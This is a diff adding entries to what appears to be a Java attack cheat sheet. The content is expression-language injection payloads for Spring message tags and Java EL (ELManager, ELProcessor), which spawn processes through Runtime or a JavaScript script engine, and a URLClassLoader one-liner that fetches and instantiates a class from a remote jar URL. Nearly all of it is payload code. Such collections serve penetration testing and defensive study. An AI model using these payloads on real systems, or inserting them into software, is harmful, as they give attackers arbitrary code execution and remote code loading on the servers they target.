@@ -336,3 +336,23 @@ Expression.evaluate(Context);
 <spring:message text="${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\",null).toString()}">
 </spring:message>
 ```
+
+- EL
+```java
+String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder('calc').start()\")";
+ELManager manager = new ELManager();
+ELContext context = manager.getELContext();
+ExpressionFactory factory = ELManager.getExpressionFactory();
+ValueExpression ve = factory.createValueExpression(context, "${" + expression + "}", Object.class);
+ve.getValue(context);
+
+ELProcessor processor = new ELProcessor();
+Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder('calc').start()\")");
+```
+
+### ClassLoader
+- URLClassLoader
+```java
+new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8888/bcel.jar")}).loadClass("BCEL").getConstructor().newInstance();
+```
+
